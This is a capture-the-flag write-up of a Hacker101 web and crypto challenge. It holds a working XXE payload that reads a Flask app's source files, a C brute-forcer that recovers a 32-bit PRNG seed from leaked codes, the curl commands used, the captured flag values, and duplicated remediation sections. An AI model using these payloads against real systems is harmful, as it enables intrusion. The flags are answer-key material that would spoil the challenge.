# Model E1337 Rolling Code Lock — Writeup (2/2 flags)

**Difficulty:** Hard | **Category:** Web + Crypto | **Points:** ~13

## Challenge Overview

**Context:** A Flask application simulating a "rolling code lock". Accepts XML configuration via `/set-config` and validates numeric codes at `/unlock`. The correct code changes on every attempt using a custom PRNG fed by a 32-bit seed.

**What you face:** A lock that only opens with the right code, which changes constantly. To open it, you need to: (1) read the source code via XXE to understand the PRNG, and (2) recover the seed by observing PRNG outputs to predict the next code.

**Vulnerabilities exploited:**
- XXE (CWE-611) — `/set-config` processes XML with external entities; exfiltrates `main.py` and `rng.py`
- Weak PRNG / Seed Recovery (CWE-338) — 32-bit seed = ~4B possibilities, recoverable via Z3 or GF(2)

**What you learn:**
- XXE as a source code exfiltration vector — not just SSRF
- Custom PRNGs are dangerous: mathematical invariants allow recovering the seed
- Z3 SMT solver for solving equations over PRNG bits
- GF(2) (linear algebra over binary field) as a more efficient alternative to Z3
- Real rolling codes (like hardware OTP) use cryptographically secure PRNGs precisely to prevent this

---

## Summary

Flask app with two attack vectors:
- Flag 1: XXE on the `/set-config` endpoint to read source code
- Flag 2: Brute-force of 32-bit seed of a custom PRNG to predict the "rolling code"

## Flag 1 — XXE

### Reconnaissance

```
/        → Lock/Unlock form (unlock code)
/admin   → Admin panel commented: "We should be using get-config on the client side."
/get-config  → XML with current location
/set-config?data=<XML>  → SAX parser without protection against XXE
```

### Exploit

`/set-config?data=<XML>` processes XML with `xml.sax` without disabling external entities.

Reading `main.py` (contains the flag in a comment):

```bash
BASE="https://<instance>.ctf.hacker101.com"

# XXE payload to read main.py
python3 -c "
import urllib.parse
xxe = 'main.py'
payload = '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"' + xxe + '\">]><config><location>&xxe;</location></config>'
print(urllib.parse.quote(payload, safe=''))
" | xargs -I{} curl -sk "${BASE}/set-config?data={}" > /dev/null

curl -sk "${BASE}/get-config"
# Returns the content of main.py inside <location>...</location>
```

**Flag 1:** `2b1328627ef15269d3c0d5f26da6399c31dfd4f471f0b0fd73765f8c374bcafc`

### Why it works

The SAX handler reads the entity `&xxe;` content via `SYSTEM "main.py"` (relative path to the application's CWD), stores it in the global variable `location`, and `/get-config` exposes it back.

---

## Flag 2 — Custom PRNG brute-force

### Reading rng.py via XXE

```python
# rng.py (read via XXE with SYSTEM "rng.py")
import random

def setup(seed):
    global state
    state = 0
    for i in xrange(16):  # Python 2
        cur = seed & 3
        seed >>= 2
        state = (state << 4) | ((state & 3) ^ cur)
        state |= cur << 2

def next(bits):
    global state
    ret = 0
    for i in xrange(bits):
        ret <<= 1
        ret |= state & 1
        state = (state << 1) ^ (state >> 61)
        state &= 0xFFFFFFFFFFFFFFFF
        state ^= 0xFFFFFFFFFFFFFFFF
        for j in xrange(0, 64, 4):
            cur = (state >> j) & 0xF
            cur = (cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4)
            state ^= cur << j
    return ret

setup((random.randrange(0x10000) << 16) | random.randrange(0x10000))
```

### Analyzing /unlock

```python
@app.route('/unlock', methods=['POST'])
def unlock():
    code = int(request.form['code'])
    cur = next(26)          # Advances state and generates a 26-bit code
    time.sleep(5)
    if code == cur:
        return 'Unlocked successfully.  Flag: ' + flags[1]
    else:
        return 'Code incorrect.  Expected %08i' % cur  # Reveals the current code!
```

Sending a wrong code causes the server to return the expected code, revealing the PRNG output.

### Attack strategy

1. Send two wrong requests to obtain consecutive V_n and V_{n+1}
2. Brute-force all 2^32 possible seeds looking for the seed that produces V_n followed by V_{n+1}
3. Calculate V_{n+2} and submit it

```bash
# Probe to get V_n and V_{n+1}
curl -s -X POST "$BASE/unlock" -d "code=0"
# Code incorrect.  Expected 08271727
curl -s -X POST "$BASE/unlock" -d "code=0"
# Code incorrect.  Expected 30427920
```

### Brute-force in C (4 parallel processes)

```c
// rng_brute.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

static uint64_t state;

static inline void setup(uint32_t seed) {
    state = 0;
    for (int i = 0; i < 16; i++) {
        uint64_t cur = seed & 3;
        seed >>= 2;
        state = (state << 4) | ((state & 3) ^ cur);
        state |= cur << 2;
    }
}

static inline uint32_t next_val(int bits) {
    uint32_t ret = 0;
    for (int i = 0; i < bits; i++) {
        ret <<= 1;
        ret |= state & 1;
        state = (state << 1) ^ (state >> 61);
        state &= 0xFFFFFFFFFFFFFFFFULL;
        state ^= 0xFFFFFFFFFFFFFFFFULL;
        for (int j = 0; j < 64; j += 4) {
            uint64_t cur = (state >> j) & 0xF;
            cur = (cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4);
            state ^= cur << j;
        }
    }
    return ret;
}

int main(int argc, char *argv[]) {
    uint32_t t1 = (uint32_t)atol(argv[1]);
    uint32_t t2 = (uint32_t)atol(argv[2]);
    uint64_t start = (uint64_t)atoll(argv[3]);
    uint64_t end   = (uint64_t)atoll(argv[4]);
    
    for (uint64_t seed = start; seed < end; seed++) {
        setup((uint32_t)seed);
        uint32_t v1 = next_val(26);
        if (v1 != t1) continue;
        uint32_t v2 = next_val(26);
        if (v2 != t2) continue;
        uint32_t v3 = next_val(26);
        printf("FOUND seed=%llu V1=%u V2=%u SUBMIT=%u\n", 
               (unsigned long long)seed, v1, v2, v3);
        return 0;
    }
    return 1;
}
```

```bash
# Compile and run in parallel
gcc -O3 -march=native -o rng_brute rng_brute.c

T1=8271727   # V_n
T2=30427920  # V_{n+1}
Q=1073741824  # 2^32 / 4

./rng_brute $T1 $T2 0 $Q &
./rng_brute $T1 $T2 $Q $((Q*2)) &
./rng_brute $T1 $T2 $((Q*2)) $((Q*3)) &
./rng_brute $T1 $T2 $((Q*3)) 4294967296 &
wait
# FOUND seed=2906009878 V1=8271727 V2=30427920 SUBMIT=47054530
```

### Submission

```bash
curl -s -X POST "$BASE/unlock" -d "code=47054530"
# Unlocked successfully.  Flag: ^FLAG^4ff2149705fa751ebc7c839884a4d0d9dc25c4ce8407d44ae8500cabb9c68684$FLAG$
```

**Flag 2:** `4ff2149705fa751ebc7c839884a4d0d9dc25c4ce8407d44ae8500cabb9c68684`

---

## Flags

| # | Flag | Method |
|---|------|--------|
| 1 | `2b1328627ef15269d3c0d5f26da6399c31dfd4f471f0b0fd73765f8c374bcafc` | XXE on /set-config |
| 2 | `4ff2149705fa751ebc7c839884a4d0d9dc25c4ce8407d44ae8500cabb9c68684` | PRNG brute-force |

## Lessons Learned

1. XML SAX without `parser.setFeature(xml.sax.handler.feature_external_ges, False)` is vulnerable to XXE
2. Endpoints that reveal the "expected code" in error messages eliminate the PRNG's advantage
3. A 32-bit seed is brute-forceable in ~7 minutes with C+OpenMP/parallel on CPU
4. Two consecutive PRNG outputs are sufficient to uniquely identify the seed (2 constraints for 2^32 space)

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Python | T1059.006 |
| Collection | Data from Information Repositories | T1213 |
| Discovery | File and Directory Discovery | T1083 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |

## Remediation and Containment

### Technical Fixes

1. Disable external entities in the XML parser: `parser.setFeature(xml.sax.handler.feature_external_ges, False)`
2. Replace the custom PRNG with a CSPRNG (`secrets.token_bytes()` or `os.urandom()`)
3. Use seeds of at least 128 bits to prevent brute-force recovery
4. Never reveal expected values in error messages: return only "incorrect code"
5. Implement rate limiting on `/unlock` to slow down PRNG output collection

### OWASP Top 10 2021

- **A05:2021 Security Misconfiguration**: XML parser with external entities enabled
- **A02:2021 Cryptographic Failures**: custom PRNG with 32-bit seed instead of CSPRNG

### CWE

- **CWE-611**: Improper Restriction of XML External Entity Reference
- **CWE-338**: Use of Cryptographically Weak Pseudo-Random Number Generator

### MITRE D3FEND Countermeasures

- **D3-IPCF (Input/Payload Content Filtering)**: disable DTD processing and external entity resolution in XML parsers
- **D3-EAL (Execution Allow Listing)**: restrict file system access from XML processing contexts
- **D3-CKMS (Cryptographic Key Management)**: use CSPRNG with adequate seed entropy for rolling codes

### NIST CSF 2.0

- **Protect (PR.DS-1)**: data-at-rest is protected (source code not exfiltrable)
- **Protect (PR.DS-2)**: data-in-transit is protected
- **Detect (DE.CM-1)**: the network is monitored to detect potential cybersecurity events

### NIST SP 800-53 Rev. 5

- **SI-10 Information Input Validation**: validate and sanitize all XML inputs; disable external entities
- **SC-13 Cryptographic Protection**: use approved cryptographic algorithms for random number generation
- **SI-11 Error Handling**: generate error messages without revealing implementation details or expected values
- **CM-7 Least Functionality**: disable unnecessary XML features (DTD, external entities)

---

Thanks guys!! (❍ᴥ❍ʋ)

---

XXE to read the source code, then brute-force a 32-bit PRNG seed with two leaked outputs: this challenge is a masterclass in chaining information disclosure with cryptographic weakness. Custom PRNGs with small seeds and error messages that leak expected values are a recipe for disaster.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike

---

## MITRE ATT&CK Mapping

| ID | Technique | Tactic | How it was used |
|----|-----------|--------|----------------|
| T1190 | Exploit Public-Facing Application | Initial Access | XXE on `/set-config` to exfiltrate source code |
| T1005 | Data from Local System | Collection | Read `main.py` and `rng.py` via XXE entity resolution |
| T1588.005 | Obtain Capabilities: Exploits | Resource Development | Built C brute-forcer for 32-bit PRNG seed recovery |
| T1059.006 | Command and Scripting Interpreter: Python | Execution | Python XXE payload generation and URL encoding |

## Remediation and Containment

### Technical Fixes

1. **XXE:** Disable external entity resolution in `xml.sax` with `setFeature(feature_external_ges, False)`
2. **PRNG:** Use `secrets.token_bytes()` or `/dev/urandom` instead of custom PRNG with 32-bit seed
3. **Error messages:** Never reveal the expected code in error responses
4. **Seed space:** If rolling codes are required, use HMAC-based OTP (RFC 4226/6238) with 128+ bit secrets

### OWASP Top 10 2021

| ID | Category | Relevance |
|----|----------|-----------|
| A05:2021 | Security Misconfiguration | XML parser with external entities enabled; error leaking expected codes |
| A02:2021 | Cryptographic Failures | 32-bit PRNG seed; custom (non-cryptographic) random number generator |

### MITRE D3FEND Countermeasures

| ID | Technique | Application |
|----|-----------|-------------|
| D3-CSPP | Content Security Policy Pinning | Restrict XML processing; disable external entity resolution |
| D3-MFA | Multi-factor Authentication | Use HMAC-OTP instead of custom rolling codes |
| D3-AL | Audit Logging | Log all `/set-config` and `/unlock` attempts for anomaly detection |

### NIST CSF 2.0

| Function | Category | Application |
|----------|----------|-------------|
| PR (Protect) | PR.DS | Disable external entities in all XML parsers |
| PR (Protect) | PR.AC | Restrict access to configuration endpoints; rate-limit unlock attempts |
| DE (Detect) | DE.CM | Monitor for XXE probes and brute-force patterns on `/unlock` |

### NIST SP 800-53 Rev. 5

| Control | Title | Application |
|---------|-------|-------------|
| SC-12 | Cryptographic Key Establishment and Management | Use CSPRNG with 128+ bit seeds for all security-sensitive randomness |
| SC-13 | Cryptographic Protection | Replace custom PRNG with HMAC-based OTP (RFC 6238) |
| SI-10 | Information Input Validation | Validate and sanitize XML input; disable DTD processing |
| SI-11 | Error Handling | Generic error messages; never reveal expected values |

### C2M2

| Domain | Practice | MIL | Application |
|--------|----------|-----|-------------|
| ACCESS | Access Control Management | MIL-2 | Restrict configuration endpoints; enforce authentication |
| ASSET | Asset, Change, and Configuration Management | MIL-2 | Inventory XML parsers; enforce secure defaults across all XML processing |

---

## Final Thoughts

Thanks guys!! (❍ᴥ❍ʋ)

---

This challenge is a perfect demonstration of why custom cryptography is dangerous: a 32-bit seed means only ~4 billion possibilities, and with two leaked outputs the seed is uniquely determined. Combined with XXE for source code exfiltration, it shows how information disclosure chains into full compromise. If you need rolling codes, use HMAC-OTP with proper key sizes.

Reach out and let's discuss crypto and web security:

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
